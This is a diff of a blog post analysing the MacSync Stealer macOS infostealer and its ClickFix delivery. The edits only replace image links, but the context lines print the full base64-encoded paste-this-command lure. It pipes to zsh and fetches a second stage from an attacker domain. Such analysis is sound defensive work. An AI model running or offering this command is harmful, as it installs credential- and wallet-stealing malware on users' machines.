@@ -13,9 +13,7 @@ render_with_liquid: false
 A security professional working in the threat hunting domain recently identified a suspicious URL specifically targeting macOS users. The campaign appears to leverage a macOS variant of the well-known ClickFix technique, making it particularly noteworthy. Cognisys researchers accepted this challenge to understand this malicious code. 
 
 Initial analysis shows that this sample shares characteristics with earlier remote-fetched variants, which typically relied on obfuscated Zsh scripts that invoked dynamic AppleScript for execution. However, this iteration demonstrates a clear evolution in tradecraft. The activity is largely memory-resident and leaves minimal artifacts on disk, significantly reducing its forensic footprint and making detection and analysis more challenging for defenders.
-![[image1.png]]
-
-  
+<img width="1288" height="928" alt="image1" src="https://github.com/user-attachments/assets/360c3ae8-c49a-46a8-afa3-d4403c6da3ef" />
 
 A quick review identified that this sample have similarities with older remote-fetched variants (delivered via obfuscated Zsh → dynamic AppleScript), while this one is memory-resident with minimal disk traces.
 
@@ -30,7 +28,7 @@ This sample relies on classic social engineering techniques such as ClickFix(a d
 
 Most payloads related to MacSync Stealer tend to run primarily in memory and leave little to no trace on disk. They typically rely on a ClickFix-style technique that tricks users into pasting a base64 encoded command. In both cases, the payload is decoded using base64 -D, decompressed with gunzip, stored in a variable and executed using eval. This then results in the fetching of a second-stage payload via curl.
  
-![[image2 1.png]]
+<img width="1286" height="866" alt="image2 1" src="https://github.com/user-attachments/assets/f6474d80-7062-411c-884f-854ab73ce107" />
 
 ```
 echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg" && echo 'ZWNobyAnSW5zdGFsbGluZyBwYWNrYWdlcyBwbGVhc2Ugd2FpdC4uLicgJiYgY3VybCAta2ZzU0wgaHR0cDovL2JhcmJlcm1vby53b3JsZC9jdXJsL2M4ZjM4OTc2ODBiNDQ4YzE5N2I5YzY2MTQ0YmY4MWQyMjg2MzNmYmRlYmVkNzg4ZTFmMDYyNWE0ZGU4MzQ4MjV8enNo'|base64 -D|zsh
@@ -39,9 +37,9 @@ echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsApple
 Base64 code block
 
 Once decoded, the base64 payload is a match to the usual MacSync Stealer. barbermoo[.]world domain is used for hosting and uploading the infostealer files & logs.
-![[image3.png]]
+<img width="2158" height="100" alt="image3" src="https://github.com/user-attachments/assets/55943917-14c6-4d14-ae97-763822916aa8" />
   
-This downloads & executes two different scripts using curl & osascript which does the following operations.![[Pasted image 20260108103659.png]]
+This downloads & executes two different scripts using curl & osascript which does the following operations.<img width="1992" height="1092" alt="image5" src="https://github.com/user-attachments/assets/b99f60a0-e28d-4aec-a0e8-3a0b90fde05d" />
 
 #### Evolution of MacSync Stealer: A Deep Dive into Memory-Resident macOS Malware
 
@@ -273,8 +271,9 @@ The script uses the macOS-specific `ditto` command to preserve resource forks in
 In order to make persistence, it checks for installed applications like ledger, trezor(popular crypto wallets) and downloads a .zip file with app.asar and Info.plist for the suitable application in order to replace the original ones.
 
   
-![[image5.png]]  
-![[Pasted image 20260108103735.png]]
+<img width="2156" height="922" alt="Pasted image 20260108103659" src="https://github.com/user-attachments/assets/5f4e5e1c-48ca-4c37-a9ed-3bd5495e8a42" />
+
+<img width="1992" height="1018" alt="Pasted image 20260108103735" src="https://github.com/user-attachments/assets/b4cd8f54-520f-474c-ac51-059fa4cebecb" />
 
 #### 9. Threat Overview (Blue Team Perspective)
 
